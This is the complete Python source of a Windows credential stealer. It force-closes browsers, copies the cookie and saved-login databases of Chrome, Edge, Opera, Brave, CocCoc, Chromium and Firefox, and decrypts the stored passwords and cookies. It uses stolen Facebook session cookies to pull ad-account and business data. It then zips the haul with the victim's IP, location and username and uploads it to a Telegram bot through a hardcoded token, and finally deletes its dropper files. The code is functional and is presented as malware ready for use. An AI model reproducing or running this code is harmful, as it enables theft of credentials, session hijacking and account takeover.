import os
try:
    import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,random,requests,time,re
    from datetime import datetime,timedelta
    from Crypto.Cipher import DES3
    from Crypto.Cipher import AES
    from pyasn1.codec.der import decoder
    from hashlib import sha1, pbkdf2_hmac
    from Crypto.Util.Padding import unpad 
    from base64 import b64decode
except:
    os.system("pip install pywin32 requests pycryptodomex pyasn1")

import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,random,requests,time,re
from datetime import datetime,timedelta
from Crypto.Cipher import DES3
from Crypto.Cipher import AES
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
from Crypto.Util.Padding import unpad 
from base64 import b64decode
apibot1='6055727531:AAEKXKTUn2xK3mdi02_mGWrcTrBL5ydrghU'
id1 = "-1002061706055"

hostname = os.getenv("COMPUTERNAME")
usernamex = os.getlogin()
windows_version = platform.platform()
now = datetime.now()
response =requests.get("https://ipinfo.io").text
ip_country = json.loads(response)
ten_country = ip_country['region']
city = ip_country['city']
ip = ip_country['ip']
country_code = ip_country['country']
newtime = str(now.hour) + "h" +str(now.minute)+"m"+str(now.second)+"s"+"-"+str(now.day)+"-"+str(now.month)+"-"+str(now.year)
name_f = country_code +" "+ ip +" "+newtime
class Facebook():
    def __init__(self, cookie: str):
        self.rq = requests.Session()
        cookies = self.parse_cookie(cookie)
        headers = {
        'authority': 'adsmanager.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'viewport-width': '794',
        }
        self.rq.headers.update(headers)
        self.rq.cookies.update(cookies)
        # print(self.rq.cookies.update(cookies))
        self.uid = cookies.get('c_user', None)

    def parse_cookie(self, cookie):
        cookies = {}
        for c in cookie.split(';'):
            key_value = c.strip().split(' = ', 1)
            if len(key_value) == 2:
                key, value = key_value
                if key.lower() in ['c_user', 'xs', 'fr']: 
                    cookies[key] = value
        
        return cookies

    def token(self):
        try:
            act = self.rq.get('https://www.facebook.com/ads/manager')
         
            list_data = act.text
            
            x = list_data.split("act=")
            idx = x[1].split('&')[0]
            id = 'act_'+idx
            list_token = self.rq.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&filter_set&nav_entry_point=cm_redirect&nav_source=no_referrer&breakdown_regrouping=1').text
            x_token = list_token.split('{window.__accessToken="')
            token = (x_token[1].split('";')[0])
            return token
        except:
            return False
   

    def Get_info_Bm(self):
        List_BM = f"https://graph.facebook.com/v17.0/me/businesses?access_token={self.token()}"
        data = self.rq.get(List_BM)
        items = data.json()["data"]
        with open((os.path.join(os.environ["TEMP"], name_f, "data.txt")), 'a',encoding='utf-8') as f:
            f.write("Tổng Số Bm: "+str(len(items))+"\n\n")
        #print("Tổng Số Bm: ",len(items))




    def Gen_list_id(self):
        all_data = []
        url = f"https://graph.facebook.com/v17.0/me/adaccounts?fields=spend_cap,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,timezone_name,business_country_code&limit=100&access_token={self.token()}"
        data = self.rq.get(url).json()
        
        for i in range(len(data["data"])):

            info = ["amount_spent","adtrust_dsl","adspaymentcycle","currency","USD","account_status","name","business_country_code","id"]
            dachitieu = data["data"][i]["amount_spent"]
            limit = data["data"][i]["adtrust_dsl"]
            try:
    
                adspaymentcycle = data["data"][i]["adspaymentcycle"]["data"][0]["threshold_amount"]
            except:
                adspaymentcycle= "TKQC Share"
            tiente = data["data"][i]["currency"]
            trangthai = data["data"][i]["account_status"]
            try:
                qg = data["data"][i]["business_country_code"]
            except:
                qg = None

            idtkqc = data["data"][i]["id"]
            name = data["data"][i]["name"]
            duno = data["data"][i]["spend_cap"]

            account_info = {
                "idtkqc": idtkqc,
                "name": name,
                "tiente": tiente,
                "qg": qg,
                "limit": limit,
                "adspaymentcycle": adspaymentcycle,
                "duno": duno,
                "trangthai": trangthai,
                "dachitieu": dachitieu
            }
            account_info_text = "|".join(str(value) for value in account_info.values())
            with open((os.path.join(os.environ["TEMP"], name_f, "data.txt")), 'a',encoding='utf-8') as f:
                f.write(account_info_text+"\n\n")
       
     

    def main(self):
        if self.token() is False:
            # print(self.token())
            return False
        else:
            return self.Gen_list_id() ,self.Get_info_Bm()
        ########################################################################################
        #######################################################################################
def check_chrome_running():
    for proc in os.popen('tasklist').readlines():
        if 'chrome.exe' in proc:
            return True
    return False

def check_firefox_running():
    for proc in os.popen('tasklist').readlines():
        if 'firefox.exe' in proc:
            return True
    return False
def check_edge_running():
    for proc in os.popen('tasklist').readlines():
        if 'msedge.exe' in proc:
            return True
    return False
def find_profile(path_userdata):
    profile_path = []
    for name in os.listdir(path_userdata):
        if name.startswith("Profile") or name == 'Default':
            dir_path = os.path.join(path_userdata, name)
            profile_path.append(dir_path)
    return profile_path

def get_chrome(data_path,chrome_path):
    data_chrome = os.path.join(data_path, "Chrome");os.mkdir(data_chrome)
    profiles = find_profile(chrome_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_chrome,"profile"+str(i)))
        def copy_file():
            while  True:
                if check_chrome_running() == True:
                    os.system('taskkill /f /im chrome.exe')
                    continue
                else:
                    if os.path.exists(os.path.join(profile,'Network','Cookies')):
                        shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_chrome,"profile"+str(i),'Cookies')) 
                    if os.path.exists(os.path.join(profile,'Login Data')):
                        shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_chrome,"profile"+str(i),'Login Data'))
                    if os.path.exists(os.path.join(profile,'Web Data')):
                        shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_chrome,"profile"+str(i),'Web Data'))
                    if os.path.exists(os.path.join(chrome_path,'Local State')):
                        shutil.copyfile(os.path.join(chrome_path,'Local State'),os.path.join(data_chrome,"profile"+str(i),'Local State'))
                    
                break
        copy_file();delete_file(os.path.join(data_chrome,"profile"+str(i)))    

def get_edge(data_path,edge_path):
    data_edge = os.path.join(data_path, "Edge");os.mkdir(data_edge)
    profiles = find_profile(edge_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_edge,"profile"+str(i)))
        def copy_file():
            while True:
                if check_edge_running():
                    os.system('taskkill /f /im msedge.exe')
                    continue
                else:
                    if os.path.exists(os.path.join(profile,'Network','Cookies')):
                        shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_edge,"profile"+str(i),'Cookies'))

                    if os.path.exists(os.path.join(profile,'Web Data')):
                        shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_edge,"profile"+str(i),'Web Data'))
                    if os.path.exists(os.path.join(profile,'Login Data')):
                        shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_edge,"profile"+str(i),'Login Data'))
                    if os.path.exists(os.path.join(edge_path,'Local State')):
                        shutil.copyfile(os.path.join(edge_path,'Local State'),os.path.join(data_edge,"profile"+str(i),'Local State'))
                    
                break
        copy_file();delete_file(os.path.join(data_edge,"profile"+str(i)))  


def get_brave(data_path,brave_path):
    data_brave = os.path.join(data_path, "Brave");os.mkdir(data_brave)
    profiles = find_profile(brave_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_brave,"profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'Network','Cookies')):
                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_brave,"profile"+str(i),'Cookies'))
            if os.path.exists(os.path.join(profile,'Web Data')):
                shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_brave,"profile"+str(i),'Web Data'))
            if os.path.exists(os.path.join(profile,'Login Data')):
                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_brave,"profile"+str(i),'Login Data'))
            if os.path.exists(os.path.join(brave_path,'Local State')):
                shutil.copyfile(os.path.join(brave_path,'Local State'),os.path.join(data_brave,"profile"+str(i),'Local State'))
        copy_file()
        delete_file(os.path.join(data_brave,"profile"+str(i)))

def get_opera(data_path,opera_path):
    data_opera = os.path.join(data_path, "Opera");os.mkdir(data_opera)
    def copy_file():
        if os.path.exists(os.path.join(opera_path,'Network','Cookies')):
            shutil.copyfile(os.path.join(opera_path,'Network','Cookies'),os.path.join(data_opera,'Cookies'))
        if os.path.exists(os.path.join(opera_path,'Web Data')):
                shutil.copyfile(os.path.join(opera_path,'Web Data'),os.path.join(data_opera,'Web Data'))
        if os.path.exists(os.path.join(opera_path,'Login Data')):
            shutil.copyfile(os.path.join(opera_path,'Login Data'),os.path.join(data_opera,'Login Data'))
        if os.path.exists(os.path.join(opera_path,'Local State')):
            shutil.copyfile(os.path.join(opera_path,'Local State'),os.path.join(data_opera,'Local State'))
    copy_file();delete_file(data_opera)
def get_coccoc(data_path,coccoc_path):
    data_coccoc= os.path.join(data_path, "CocCoc");os.mkdir(data_coccoc)
    profiles = find_profile(coccoc_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_coccoc,"profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'Network','Cookies')):
                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_coccoc,"profile"+str(i),'Cookies'))
            if os.path.exists(os.path.join(profile,'Web Data')):
                shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_coccoc,"profile"+str(i),'Web Data'))
            if os.path.exists(os.path.join(profile,'Login Data')):
                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_coccoc,"profile"+str(i),'Login Data'))
            if os.path.exists(os.path.join(coccoc_path,'Local State')):
                shutil.copyfile(os.path.join(coccoc_path,'Local State'),os.path.join(data_coccoc,"profile"+str(i),'Local State'))
        copy_file();    
        delete_file(os.path.join(data_coccoc,"profile"+str(i)))
        

def get_chromium(data_path,chromium_path):
    data_chromium= os.path.join(data_path, "Chromium");os.mkdir(data_chromium)
    profiles = find_profile(chromium_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_chromium,"profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'Cookies')):
                shutil.copyfile(os.path.join(profile,'Cookies'),os.path.join(data_chromium,"profile"+str(i),'Cookies'))
            if os.path.exists(os.path.join(profile,'Web Data')):
                shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_chromium,"profile"+str(i),'Web Data'))
            if os.path.exists(os.path.join(profile,'Login Data')):
                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_chromium,"profile"+str(i),'Login Data'))
            if os.path.exists(os.path.join(chromium_path,'Local State')):
                shutil.copyfile(os.path.join(chromium_path,'Local State'),os.path.join(data_chromium,"profile"+str(i),'Local State'))
        copy_file();delete_file(os.path.join(data_chromium,"profile"+str(i)))
def find_profile_firefox(firefox_path):
    profile_path = []
    for name in os.listdir(firefox_path):
            dir_path = os.path.join(firefox_path, name)
            profile_path.append(dir_path)
    return profile_path

def get_firefox(data_path,firefox_path):
    data_firefox = os.path.join(data_path,'firefox');os.mkdir(data_firefox)
    profiles = find_profile_firefox(firefox_path)
   
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_firefox,"profile"+str(i)))

        def copy_file():
            while True:
                if check_firefox_running():
                    os.system('taskkill /f /im firefox.exe')
                    continue
                else:
                    if os.path.exists(os.path.join(profile,'cookies.sqlite')):
                        shutil.copyfile(os.path.join(profile,'cookies.sqlite'),os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite'))
                    if os.path.exists(os.path.join(profile,'key4.db')):
                        shutil.copyfile(os.path.join(profile,'key4.db'),os.path.join(data_firefox,"profile"+str(i),'key4.db'))
                    if os.path.exists(os.path.join(profile,'logins.json')):
                        shutil.copyfile(os.path.join(profile,'logins.json'),os.path.join(data_firefox,"profile"+str(i),'logins.json'))
                            
                break
            
            
        copy_file()
        if os.path.exists(os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite')):

            delete_firefox(os.path.join(data_firefox,"profile"+str(i)))
        else:
            shutil.rmtree(os.path.join(data_firefox,"profile"+str(i)))   

def encrypt(data_profile):
    login_db = os.path.join(data_profile, "Login Data")
    key_db = os.path.join(data_profile ,"Local State",)
    cookie_db = os.path.join(data_profile, "Cookies")
    credit_db=os.path.join(data_profile, "Web Data")
    with open(key_db, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    master_key_str = str(master_key)
    # print(master_key_str)

    with open((os.path.join(data_profile, "master_key.txt")), 'a',encoding='utf-8') as f:
        f.write(master_key_str)   
    try :
        conn = sqlite3.connect(login_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_password = decrypted_pass[:-16].decode() 
            with open((os.path.join(data_profile, "pass.txt")), 'a',encoding='utf-8') as f:
                f.write("URL: " + url + "\t\t" + username + "|" + decrypted_password + "\n" + "\n")      
    except :
        
        pass
    def decrypt_data(data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
    
    try:    
        conn2 = sqlite3.connect(cookie_db)
        conn2.text_factory = lambda b: b.decode(errors="ignore")
        cursor2 = conn2.cursor()
        cursor2.execute("""
        SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc
        FROM cookies
        """)
        json_data = []
        for host_key, name, value,encrypted_value,is_httponly,is_secure,expires_utc in cursor2.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value,master_key)
            else:
                decrypted_value = value
            json_data.append({
                "host": host_key,
                "name": name,
                "value": decrypted_value,
                "is_httponly":is_httponly,
                "is_secure":is_secure,
                "expires_utc":expires_utc
                })
            
        result = []
        for item in json_data:
            host = item["host"]
            name = item["name"]
            value = item["value"]
            is_httponly= item["is_httponly"]
            is_secure=item["is_secure"]
            expires_utc = item["expires_utc"]
            if host == ".facebook.com":
                result.append(f"{name} = {value}")
            if is_httponly == 1 : httponly = "TRUE"
            else:httponly = "FALSE"
            if is_secure == 1 : secure = "TRUE"
            else:secure = "FALSE"
            cookie = f"{host}\t{httponly}\t{'/'}\t{secure}\t\t{name}\t{value}\n"          
            with open((os.path.join(data_profile, "cookie.txt")), 'a') as f:
                f.write(cookie)
        result_string = ";".join(result)
        
        with open((os.path.join(os.environ["TEMP"], name_f, "cookiefb.txt")), 'a',encoding='utf-8') as f:
            f.write(result_string+"\n\n")
  
    except:
        pass
def delete_file(data_profile):
    try:
        encrypt(data_profile)
    except:
        pass
def decryptMoz3DES( globalSalt, entrySalt, encryptedData ):
  hp = sha1( globalSalt ).digest()
  pes = entrySalt + b'\x00'*(20-len(entrySalt))
  chp = sha1( hp+entrySalt ).digest()
  k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
  tk = hmac.new(chp, pes, sha1).digest()
  k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
  k = k1+k2
  iv = k[-8:]
  key = k[:24]
  return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)

def decodeLoginData(data):
  asn1data = decoder.decode(b64decode(data)) # decodage base64, puis ASN1
  key_id = asn1data[0][0].asOctets()
  iv = asn1data[0][1][1].asOctets()
  ciphertext = asn1data[0][2].asOctets()
  return key_id, iv, ciphertext 
def getLoginData(afkk):
  logins = []
  json_file = os.path.join(afkk ,"logins.json")
  loginf = open( json_file, 'r',encoding='utf-8').read()
  jsonLogins = json.loads(loginf)
  for row in jsonLogins['logins']:
    encUsername = row['encryptedUsername']
    encPassword = row['encryptedPassword']
    logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']) )
  return logins

def decryptPBE(decodedItem, globalSalt): 
  pbeAlgo = str(decodedItem[0][0][0])
  if pbeAlgo == '1.2.840.113549.1.12.5.1.3': 
    entrySalt = decodedItem[0][0][1][0].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    key = decryptMoz3DES( globalSalt, entrySalt, cipherT )
    return key[:24]
  elif pbeAlgo == '1.2.840.113549.1.5.13': #pkcs5 pbes2  
    entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
    iterationCount = int(decodedItem[0][0][1][0][1][1])
    keyLength = int(decodedItem[0][0][1][0][1][2])
    k = sha1(globalSalt).digest()
    key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)    
    iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
    return clearText

def getKey(afk):  
    conn = sqlite3.connect(os.path.join(afk, "key4.db"))
    c = conn.cursor()
    c.execute("SELECT item1,item2 FROM metadata;")

    row = c.fetchone()
    globalSalt = row[0] 
    item2 = row[1]
    decodedItem2 = decoder.decode( item2 ) 
    clearText = decryptPBE( decodedItem2, globalSalt )
    if clearText == b'password-check\x02\x02': 
      c.execute("SELECT a11,a102 FROM nssPrivate;")
      for row in c:
        if row[0] != None:
            break
      a11 = row[0]
      a102 = row[1] 
      if a102 != None: 
        decoded_a11 = decoder.decode( a11 )
        clearText= decryptPBE( decoded_a11, globalSalt )
        return clearText[:24]   
    return None
def encrypt_firefox(path_f):
    try:
        if os.path.exists(os.path.join(path_f ,"logins.json")):
            key = getKey(path_f)
            logins = getLoginData(path_f)

            for i in logins:
                username= unpad( DES3.new( key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]),8 ) 
                password= unpad( DES3.new( key, DES3.MODE_CBC, i[1][1]).decrypt(i[1][2]),8 ) 
                str_pass =  password.decode('utf-8')
                str_user =  username.decode('utf-8')
                with open((os.path.join(path_f,"pass.txt")), 'a',encoding='utf-8') as f:
                    f.write(i[2]+"          "+str_user + "|"+ str_pass + "\n")
    except :
        pass
    try:
        db_path = os.path.join(path_f, "cookies.sqlite")
        db = sqlite3.connect(db_path) 
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        cursor.execute("""
        SELECT id , name, value ,host
        FROM moz_cookies
        """)
        json_data = []
        for id , name, value ,host in cursor.fetchall():
            json_data.append({
                "host": host,
                "name": name,
                "value": value
                
            })
        result = []
        for item in json_data:
            host = item["host"]
            name = item["name"]
            value = item["value"]
            if host == ".facebook.com":
                result.append(f"{name} = {value}")
            cookie = f"{host}\t\t{'/'}\t\t\t{name}\t{value}\n"          
            with open((os.path.join(path_f, "cookie.txt")), 'a') as f:
                f.write(cookie)
        result_string = "; ".join(result)
        
        with open((os.path.join(os.environ["TEMP"], name_f, "cookiefb.txt")), 'a',encoding='utf-8') as f:
            f.write(result_string+"\n" +  "\n")
    except:
        pass
    
def delete_firefox(data_firefox_profile):
    
    try:
        encrypt_firefox(data_firefox_profile)
    except: 
        pass
   
def demso() :
    path_demso = r"C:\Users\Public\number.txt"
    if os.path.exists(path_demso):
        with open(path_demso, 'r') as file:
            number = file.read()
        number = int(number)+1
        with open(path_demso, 'w') as file:
            abc = str(number)
            file.write(abc)
    else:
        with open(path_demso, 'w') as file:
            file.write("1")
            number = 1
    return number

def id() :
    path_id = r"C:\Users\Public\id.txt"
    if os.path.exists(path_id):
        with open(path_id, 'r') as file:
            id = file.read()
    else:
        random_number = random.randint(10**14, 10**15 - 1)
        id = str(random_number)
        with open(path_id, 'w') as file:
            file.write(id)
    return id
def main():
    so = demso()
    number = "data lan thu " + str(so)
    
    u1 = 'https://api.telegram.org/bot'+apibot1+'/sendDocument'
    data_path = os.path.join(os.environ["TEMP"], name_f);os.mkdir(data_path)
    window = os.path.join(os.environ["TEMP"], name_f,"window.txt")
    user_argent = os.path.join(os.environ["TEMP"], name_f,"user_argent.txt")
    cookiefb =  os.path.join(os.environ["TEMP"], name_f, "cookiefb.txt")
    
    try:
        folder_names = []


        for entry in os.scandir(r'C:\Program Files\Google\Chrome\Application'):
            if entry.is_dir():
                folder_names.append(entry.name)
        with open(user_argent, 'w') as file:
            for folder_name in folder_names:
                file.write(folder_name + '\n')

    except:pass
    try:
        result = os.popen('tasklist').read()
        with open(window, 'w') as file:
            file.write(result)
    except :
        pass
    chrome = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    firefox = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming","Mozilla", "Firefox", "Profiles")
    Edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
    Opera = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
    Brave = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","BraveSoftware", "Brave-Browser", "User Data")
    coccoc = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","CocCoc", "Browser", "User Data")
    chromium = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Chromium", "User Data")
    
    if os.path.exists(chrome):
        try:
            get_chrome(data_path,chrome)
        except: 
            pass
    if os.path.exists(Edge):
        try:
            get_edge(data_path,Edge)
        except: 
            pass
        
    if os.path.exists(Opera):
        try:
            get_opera(data_path,Opera)
        except: 
            pass
        
    if os.path.exists(Brave):
        try:
            get_brave(data_path,Brave)
        except: 
            pass
        
    if os.path.exists(coccoc):
        try:
             get_coccoc(data_path,coccoc)
        except: 
            pass
       
    if os.path.exists(firefox):
        try:
             get_firefox(data_path,firefox)
        except: 
            pass
       
    if os.path.exists(chromium):
        try:
           get_chromium(data_path,chromium)  
        except: 
            pass 
    

    cookies=[]
    with open(cookiefb, 'r') as file:
        for line in file:
            cleaned_line = line.strip()
            if cleaned_line != '':
                cookies.append(cleaned_line)
    for cookie in cookies:
        try:
            api = Facebook(cookie)
            api.main()
        except:
            pass
    z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', data_path)
  
    with open(z_ph, 'rb') as f:
    
        requests.post(u1,data={'caption': "\n"+"country :  " + city + "-"+ten_country+"-"+country_code +"\n" +"id :  " + id() +"\n"+ windows_version +"\nip: "+ip +"\nUsername :"+hostname+"/"+usernamex+ "\n"+ number,'chat_id': id1},files={'document': f})
    

# for _ in range(3):
    
main()
if os.path.exists(r'C:\Users\Public\pub.bat'):
    os.remove(r'C:\Users\Public\pub.bat')
if os.path.exists(r'C:\Users\Public\publicc.bat'):
    os.remove(r'C:\Users\Public\publicc.bat')
if os.path.exists(r'C:\Users\Public\Document.zip'):
    os.remove(r'C:\Users\Public\Document.zip') 
    # time.sleep(300)

